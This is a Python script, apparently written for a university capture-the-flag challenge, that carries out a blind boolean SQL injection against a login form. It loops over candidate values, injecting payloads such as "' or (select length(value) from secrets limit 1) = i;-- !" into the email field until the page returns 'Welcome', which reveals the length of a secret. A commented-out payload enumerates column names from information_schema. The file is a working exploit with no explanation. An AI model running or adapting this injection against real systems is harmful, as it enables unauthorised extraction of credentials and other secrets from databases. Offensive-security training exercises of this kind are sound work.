import requests

i = 1
print("beginning attempt")
cookies = {"CHALBROKER_USER_ID":"joe215"}
data = {"email":"' or (select length(value) from secrets limit 1) = "+str(i)+";-- !","password":"ahdjasd"}
#data = {"email":"' or (SELECT LENGTH(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='users' LIMIT 2,1)="+str(i)+";-- !", "password":"ahdjasd"}

while True:
	print("Trying length is: " + str(i))
	req = requests.post("http://offsec-chalbroker.osiris.cyber.nyu.edu:1241/login.php?", cookies=cookies, data=data)
	if "Welcome" in req.text:
		print("length of value 1: " + str(i))
		break
	i += 1
	data = {"email":"' or (select length(value) from secrets limit 1) = "+str(i)+";-- !","password":"ahdjasd"}
